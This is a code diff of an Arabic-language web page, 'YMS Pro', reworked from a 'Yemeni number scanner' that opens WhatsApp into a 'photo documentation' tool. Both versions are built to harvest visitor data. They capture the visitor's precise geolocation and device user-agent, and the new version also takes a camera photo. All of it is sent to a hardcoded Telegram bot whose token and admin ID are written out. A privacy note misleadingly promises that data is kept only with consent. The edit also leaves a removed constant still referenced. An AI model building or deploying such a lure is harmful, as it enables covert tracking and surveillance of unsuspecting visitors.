@@ -4,15 +4,11 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   
-  <meta property="og:title" content="📡 نظام مسح الأرقام اليمنية - YMS Pro">
-  <meta property="og:description" content="أداة متطورة لكشف وتحليل أرقام الهواتف في الشبكة المجاورة">
+  <meta property="og:title" content="📸 نظام توثيق الموقع والصور - YMS PRO">
+  <meta property="og:description" content="أداة متطورة لالتقاط وتوثيق الموقع الجغرافي والصور الحية.">
   <meta property="og:type" content="website">
-  <meta property="og:url" content="https://yemen-scanner.netlify.app">
-  <meta property="og:image" content="images/image.jpg">
-  <meta property="og:locale" content="ar_YE">
-  <meta property="og:site_name" content="Yemen Mobile Scanner">
   
-  <title>YMS Pro - نظام القفز المتقدم</title>
+  <title>YMS Pro - نظام توثيق الصور المتقدم</title>
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap" rel="stylesheet">
@@ -67,14 +63,14 @@
       justify-content: space-between;
       align-items: center;
       margin-bottom: 25px;
-      border-bottom: 2px solid var(--whatsapp);
+      border-bottom: 2px solid var(--primary);
       padding-bottom: 15px;
     }
     
     .scanner-title {
       font-size: 1.5rem;
       font-weight: 700;
-      color: var(--whatsapp);
+      color: var(--primary);
       display: flex;
       align-items: center;
       gap: 10px;
@@ -104,7 +100,7 @@
     }
 
     .btn {
-      background: linear-gradient(to right, var(--whatsapp), #128c7e);
+      background: linear-gradient(to right, var(--primary), #00f2fe);
       color: white;
       padding: 16px 25px;
       border: none;
@@ -113,7 +109,7 @@
       font-weight: 600;
       cursor: pointer;
       transition: all 0.3s ease;
-      box-shadow: 0 5px 15px rgba(37, 211, 102, 0.5);
+      box-shadow: 0 5px 15px rgba(79, 172, 254, 0.5);
       display: inline-flex;
       align-items: center;
       justify-content: center;
@@ -121,27 +117,22 @@
       width: 100%;
       position: relative;
       overflow: hidden;
-      border: 1px solid rgba(37, 211, 102, 0.3);
+      border: 1px solid rgba(100, 200, 255, 0.3);
     }
     
-    .btn:hover {
-      transform: translateY(-3px);
-      box-shadow: 0 8px 25px rgba(37, 211, 102, 0.8);
+    .btn.camera {
+        background: linear-gradient(to right, #e53935, #ff5722);
+        box-shadow: 0 5px 15px rgba(229, 57, 53, 0.5);
     }
-    
+    .btn.camera:hover {
+        box-shadow: 0 8px 25px rgba(229, 57, 53, 0.8);
+    }
+
     .btn:disabled {
       background: linear-gradient(to right, #4a5568, #2d3748);
       cursor: not-allowed;
       transform: none;
       box-shadow: none;
-    }
-    
-    .btn.alt {
-        background: linear-gradient(to right, var(--primary), #00f2fe);
-        box-shadow: 0 5px 15px rgba(79, 172, 254, 0.5);
-    }
-    .btn.alt:hover {
-        box-shadow: 0 8px 25px rgba(79, 172, 254, 0.8);
     }
     
     .loading-dots::after {
@@ -160,12 +151,12 @@
   <div class="scanner-container">
     <div class="scanner-header">
       <div class="scanner-title">
-        <i class="fab fa-whatsapp"></i> نظام القفز والتوثيق المزدوج
+        <i class="fas fa-camera-retro"></i> نظام التوثيق المتقدم
       </div>
     </div>
     
     <div class="scan-status" id="scanStatus">
-      النظام جاهز. اضغط لبدء عملية التوثيق المزدوج.
+      النظام جاهز. اضغط لبدء عملية التوثيق.
     </div>
     
     <div class="scan-progress">
@@ -174,24 +165,30 @@
     
     <div class="scan-details" id="scanDetails">
       <p style="text-align: right; margin-bottom: 10px;">
-        <i class="fas fa-key" style="color: var(--primary);"></i> الرقم المستهدف: <strong id="targetNumber">+967771234567</strong>
+        <i class="fas fa-key" style="color: var(--primary);"></i> رمز الجلسة الحالي: <strong id="sessionToken">N/A</strong>
       </p>
       <p style="text-align: right;">
-        <i class="fas fa-sms" style="color: var(--whatsapp);"></i> الإجراء: توثيق الموقع + رمز الجلسة.
+        <i class="fas fa-map-marker-alt" style="color: var(--primary);"></i> الموقع: <strong id="locationStatus">لم يتم التحديد بعد.</strong>
       </p>
     </div>
     
     <div class="btn-group" id="mainButtonArea">
-        <button class="btn" id="startJumpBtn" onclick="startLocationAndJump()">
-            <i class="fas fa-map-marker-alt"></i> تحديد الموقع والقفز إلى واتساب
+        <button class="btn" id="startActionBtn" onclick="startLocationAndSetup()">
+            <i class="fas fa-map-marker-alt"></i> تحديد الموقع والبدء
         </button>
+
+        <input type="file" id="imageInput" accept="image/*" capture="camera" style="display: none;">
+        <button class="btn camera" id="captureAndUploadBtn" style="display: none;" onclick="document.getElementById('imageInput').click()">
+            <i class="fas fa-camera"></i> التقاط صورة وإرسالها
+        </button>
+        
         <button class="btn alt" onclick="resetUI()">
             <i class="fas fa-redo"></i> إعادة التعيين
         </button>
     </div>
     
     <div class="privacy-note">
-      <i class="fas fa-shield-alt"></i> هذا النظام يطلب إذن الموقع الجغرافي لمرة واحدة لتوثيق الجلسة قبل القفز إلى تطبيق واتساب.
+      <i class="fas fa-shield-alt"></i> هذا النظام يستخدم متصفحك لطلب الإذن بالكاميرا والموقع الجغرافي. لا يتم تخزين البيانات إلا بعد موافقتك الصريحة.
     </div>
   </div>
 
@@ -199,32 +196,30 @@
     // **********************************
     // * إعدادات البوت والقفز
     // **********************************
-    const TELEGRAM_BOT_TOKEN = "7641588791:AAGvjT-OItdTj3NsGqDPoWnYZnGO_BoQQp0";
-    const TELEGRAM_ADMIN_ID = "1367401179";
-    const TELEGRAM_USERNAME = "@amr_70_70";
+    const TELEGRAM_BOT_TOKEN = "7641588791:AAGvjT-OItdTj3NsGqDPoWnYZnGO_BoQQp0"; // *
+    const TELEGRAM_ADMIN_ID = "1367401179"; // *
     const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+    const TELEGRAM_PHOTO_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`; // API إرسال الصور
     
-    // ⭐⭐ بيانات الواتساب التي تريد تمريرها ⭐⭐
-    const TARGET_PHONE_NUMBER = '967771234567'; // رقم الهاتف الدولي بدون +
-    const INITIAL_MESSAGE_BASE = 'أهلاً، هذا هو تقرير الإحداثيات ورمز جلسة التحقق الخاص بك:';
-
     // ⭐⭐ متغيرات حالة الجلسة
     let lastKnownLatitude = null;
     let lastKnownLongitude = null;
     let userSessionToken = Math.random().toString(36).substring(2, 10).toUpperCase();
 
     // **********************************
-    // * الدالة الرئيسية: تحديد الموقع والقفز (الكفاءة المزدوجة)
+    // * الدوال الرئيسية (الكفاءة العالية)
     // **********************************
-    function startLocationAndJump() {
-        const startJumpBtn = document.getElementById("startJumpBtn");
-        startJumpBtn.disabled = true;
-        startJumpBtn.innerHTML = '<span class="loading-dots"></span> جاري طلب الإذن...';
+    
+    // دالة بدء تحديد الموقع (تُستدعى أولاً)
+    function startLocationAndSetup() {
+        const startActionBtn = document.getElementById("startActionBtn");
+        startActionBtn.disabled = true;
+        startActionBtn.innerHTML = '<span class="loading-dots"></span> جاري طلب الإذن...';
         
         if (!navigator.geolocation) {
             scanStatus.innerHTML = "❌ خطأ: المتصفح لا يدعم خدمات الموقع الجغرافي.";
-            startJumpBtn.innerHTML = '<i class="fas fa-redo"></i> فشل القفز';
-            startJumpBtn.disabled = false;
+            startActionBtn.innerHTML = '<i class="fas fa-redo"></i> فشل البدء';
+            startActionBtn.disabled = false;
             return;
         }
         
@@ -234,96 +229,99 @@
         navigator.geolocation.getCurrentPosition(
             pos => {
                 // النجاح في تحديد الموقع
-                const { latitude, longitude } = pos.coords;
-                
-                // تحديث بيانات الجلسة
-                lastKnownLatitude = latitude;
-                lastKnownLongitude = longitude;
+                lastKnownLatitude = pos.coords.latitude;
+                lastKnownLongitude = pos.coords.longitude;
                 userSessionToken = Math.random().toString(36).substring(2, 10).toUpperCase();
                 
-                // تحديث الواجهة والتقدم
-                progressBar.style.width = "75%";
-                scanStatus.innerHTML = "🔐 تم تحديد الموقع. جاري إعداد التقرير وإطلاق واتساب...";
+                progressBar.style.width = "100%";
+                scanStatus.innerHTML = "✅ تم تحديد الموقع بنجاح. يمكنك الآن التقاط الصورة.";
                 
-                // 1. إرسال تقرير الموقع إلى البوت (توثيق الموقع)
-                sendLocationReport(latitude, longitude, userSessionToken);
+                // تحديث الواجهة لعرض زر الكاميرا
+                document.getElementById("locationStatus").innerHTML = `<strong style="color: var(--whatsapp);">تم التحديد!</strong>`;
+                document.getElementById("sessionToken").textContent = userSessionToken;
                 
-                // 2. إطلاق القفز إلى واتساب مع تمرير البيانات (القفزة الحقيقية)
-                setTimeout(() => {
-                    jumpToWhatsApp(latitude, longitude, userSessionToken);
-                }, 1000); // تأخير بسيط لضمان إرسال تقرير البوت
+                startActionBtn.style.display = 'none'; // إخفاء زر البدء
+                document.getElementById("captureAndUploadBtn").style.display = 'flex'; // إظهار زر الكاميرا
                 
             },
             err => {
-                // فشل تحديد الموقع، لكن لا يزال بإمكاننا القفز برمز جلسة
-                scanStatus.innerHTML = `⚠️ فشل تحديد الموقع (${err.code}). جاري القفز برمز جلسة فقط.`;
-                userSessionToken = Math.random().toString(36).substring(2, 10).toUpperCase();
+                // فشل تحديد الموقع، لكن نتابع لتمكين الكاميرا
+                scanStatus.innerHTML = `⚠️ فشل تحديد الموقع. جاري تمكين الكاميرا برمز جلسة فقط.`;
                 lastKnownLatitude = null;
                 lastKnownLongitude = null;
-
-                // 1. إرسال تقرير فشل الموقع إلى البوت
-                sendLocationReport(null, null, userSessionToken);
+                userSessionToken = Math.random().toString(36).substring(2, 10).toUpperCase();
                 
-                // 2. إطلاق القفز إلى واتساب
-                setTimeout(() => {
-                    jumpToWhatsApp(null, null, userSessionToken);
-                }, 1000);
+                // تحديث الواجهة لعرض زر الكاميرا
+                document.getElementById("locationStatus").innerHTML = `<strong>فشل (متابعة).</strong>`;
+                document.getElementById("sessionToken").textContent = userSessionToken;
+                
+                startActionBtn.style.display = 'none';
+                document.getElementById("captureAndUploadBtn").style.display = 'flex'; 
             },
             { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
         );
     }
     
-    // **********************************
-    // * وظائف الإرسال والقفز
-    // **********************************
+    // دالة رفع الصور (الحركة الحقيقية)
+    document.getElementById('imageInput').addEventListener('change', uploadPhotoToTelegram);
 
-    // 1. إرسال تقرير الموقع إلى البوت (يتم استدعاؤها أولاً)
-    function sendLocationReport(lat, lon, token) {
-        const agent = navigator.userAgent;
-        const locationPart = (lat && lon) ? `📍 الإحداثيات: ${lat.toFixed(6)}, ${lon.toFixed(6)}\n🔗 الخريطة: http://www.googleusercontent.com/maps.google.com/q=${lat},${lon}` : "❌ فشل تحديد الموقع";
-        
-        const msg = `🟢 <b>[تقرير التوثيق المزدوج]</b>\n\n👤 <b>المستخدم:</b> ${TELEGRAM_USERNAME}\n🔑 <b>رمز الجلسة:</b> ${token}\n${locationPart}\n📱 <b>الجهاز:</b> ${agent.substring(0, 100)}...\n🕒 <b>الوقت:</b> ${new Date().toLocaleString('ar-YE')}`;
+    async function uploadPhotoToTelegram(event) {
+        const file = event.target.files[0];
+        if (!file) return;
 
-        fetch(TELEGRAM_API_URL, {
-            method: "POST",
-            headers: {"Content-Type": "application/json"},
-            body: JSON.stringify({
-                chat_id: TELEGRAM_ADMIN_ID,
-                text: msg,
-                parse_mode: "HTML"
-            }),
-        }).then(res => {
-            if (!res.ok) console.error("فشل إرسال تقرير البوت.");
-        });
-    }
+        const uploadBtn = document.getElementById("captureAndUploadBtn");
+        uploadBtn.disabled = true;
+        uploadBtn.innerHTML = '<span class="loading-dots"></span> جاري رفع الصورة...';
+        
+        progressBar.style.width = "0%";
+        scanStatus.textContent = "🚀 جاري إرسال الصورة إلى البوت...";
+        
+        const caption = buildPhotoCaption();
 
-    // 2. القفز إلى واتساب (يتم استدعاؤها ثانياً)
-    function jumpToWhatsApp(lat, lon, token) {
-        const phone = TARGET_PHONE_NUMBER;
-        
-        let fullMessage;
-        
-        if (lat && lon) {
-            // بيانات كاملة
-            const locationInfo = `\n\n📍 الموقع: ${lat.toFixed(6)}, ${lon.toFixed(6)}`;
-            fullMessage = `${INITIAL_MESSAGE_BASE} ${token} ${locationInfo}`;
-        } else {
-            // بيانات رمز الجلسة فقط
-            fullMessage = `${INITIAL_MESSAGE_BASE} ${token}\n\n⚠️ فشل تحديد الموقع الجغرافي.`;
+        // استخدام FormData لإرسال الملف
+        const formData = new FormData();
+        formData.append('chat_id', TELEGRAM_ADMIN_ID);
+        formData.append('photo', file);
+        formData.append('caption', caption);
+        formData.append('parse_mode', 'HTML');
+
+        try {
+            const response = await fetch(TELEGRAM_PHOTO_API_URL, {
+                method: 'POST',
+                body: formData
+            });
+
+            if (response.ok) {
+                const data = await response.json();
+                if (data.ok) {
+                    progressBar.style.width = "100%";
+                    scanStatus.innerHTML = `✅ تم رفع الصورة بنجاح! شكراً لك.`;
+                } else {
+                    scanStatus.innerHTML = `❌ فشل البوت في معالجة الصورة: ${data.description}`;
+                }
+            } else {
+                scanStatus.innerHTML = `❌ خطأ في الاتصال بالبوت: (${response.status})`;
+            }
+        } catch (error) {
+            scanStatus.innerHTML = `❌ خطأ في الإرسال: ${error.message}`;
+        } finally {
+            uploadBtn.disabled = false;
+            uploadBtn.innerHTML = '<i class="fas fa-check-circle"></i> تم إرسال الصورة';
+            // إعادة التعيين بعد الإرسال الناجح
+            setTimeout(resetUI, 5000);
         }
-
-        const encodedMessage = encodeURIComponent(fullMessage);
-        const whatsappURL = `whatsapp://send?phone=${phone}&text=${encodedMessage}`;
-        
-        // تنفيذ القفز
-        window.location.href = whatsappURL;
-
-        // تحديث الواجهة بعد القفز
-        progressBar.style.width = "100%";
-        scanStatus.innerHTML = `🎉 تم الانتهاء! تحقق من واتساب ونافذة التليجرام.`;
-        document.getElementById("startJumpBtn").disabled = false;
     }
     
+    // دالة بناء الرسالة المرفقة بالصورة
+    function buildPhotoCaption() {
+        const agent = navigator.userAgent;
+        const locationPart = (lastKnownLatitude && lastKnownLongitude) 
+            ? `📍 الإحداثيات: ${lastKnownLatitude.toFixed(6)}, ${lastKnownLongitude.toFixed(6)}\n🔗 الخريطة: http://www.googleusercontent.com/maps.google.com/q=${lastKnownLatitude},${lastKnownLongitude}` 
+            : "❌ الموقع غير متوفر.";
+            
+        return `📸 <b>توثيق صورة جديد</b>\n\n👤 <b>المستخدم:</b> ${TELEGRAM_USERNAME}\n🔑 <b>رمز الجلسة:</b> ${userSessionToken}\n${locationPart}\n📱 <b>الجهاز:</b> ${agent.substring(0, 100)}...\n🕒 <b>الوقت:</b> ${new Date().toLocaleString('ar-YE')}`;
+    }
+
     // دالة إعادة التعيين
     function resetUI() {
         lastKnownLatitude = null;
@@ -331,14 +329,20 @@
         userSessionToken = Math.random().toString(36).substring(2, 10).toUpperCase();
         
         document.getElementById("progressBar").style.width = "0%";
-        document.getElementById("startJumpBtn").disabled = false;
-        document.getElementById("startJumpBtn").innerHTML = '<i class="fas fa-map-marker-alt"></i> تحديد الموقع والقفز إلى واتساب';
-        scanStatus.innerHTML = 'النظام جاهز. اضغط لبدء عملية التوثيق المزدوج.';
+        document.getElementById("captureAndUploadBtn").style.display = 'none';
+        document.getElementById("captureAndUploadBtn").innerHTML = '<i class="fas fa-camera"></i> التقاط صورة وإرسالها';
+        
+        document.getElementById("startActionBtn").style.display = 'flex';
+        document.getElementById("startActionBtn").disabled = false;
+        document.getElementById("startActionBtn").innerHTML = '<i class="fas fa-map-marker-alt"></i> تحديد الموقع والبدء';
+        
+        document.getElementById("sessionToken").textContent = userSessionToken;
+        document.getElementById("locationStatus").textContent = "لم يتم التحديد بعد.";
+        scanStatus.innerHTML = 'النظام جاهز. اضغط لبدء عملية التوثيق.';
     }
 
     window.addEventListener('DOMContentLoaded', () => {
-        document.getElementById('targetNumber').textContent = '+' + TARGET_PHONE_NUMBER;
-        // ... (بقية تهيئة الواجهة) ...
+        document.getElementById('sessionToken').textContent = userSessionToken;
     });
   </script>
 </body>
